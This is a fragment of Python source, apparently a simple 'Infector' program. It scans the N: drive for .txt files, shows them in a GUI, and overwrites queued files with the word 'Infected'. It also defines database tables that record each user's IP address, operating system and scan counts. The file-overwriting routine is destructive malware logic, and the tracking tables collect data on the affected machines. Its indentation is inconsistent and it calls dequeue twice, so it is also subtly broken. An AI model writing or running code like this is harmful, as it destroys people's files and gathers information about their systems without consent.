for file in Infector().findTxtFilesGUI():
            label = Label(self.root, text= file + " Files")
            label.pack()


def infectTxtFiles(self):
        print("POPPED" + self.q.dequeue())
        FH = open(self.q.dequeue(), "w")
        FH.write("Infected")
        FH.close()
    
def findTxtFilesGUI(self):
        filedest = []
        for files in os.walk(r"N:"):
            for file in files[2]:
                if (file.split(".")[-1]) == "txt":
                    filedest.append("File found: " + files[0] + "\\" + file)
        return filedest

def createTable(self): # only for testing purposes
        self.db.execute(
            """
		CREATE TABLE User (
			UserId UNIQUEIDENTIFIER NOT NULL PRIMARY KEY,
			IpAddress VARCHAR(15) NOT NULL,
			TotalFileCount INT NOT NULL,
			LastScan DATETIME  NOT NULL,
			OperatingSystem VARCHAR(30) NOT NULL,
			NumberOfScans INT NOT NULL
		);
		"""
        )

        self.db.execute(
            """
		CREATE TABLE UserFiles (
			Id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
			UserId NOT NULL,
			FileType VARCHAR(4) not NULL,
			FileCount INT NOT NULL
		);
		"""
        )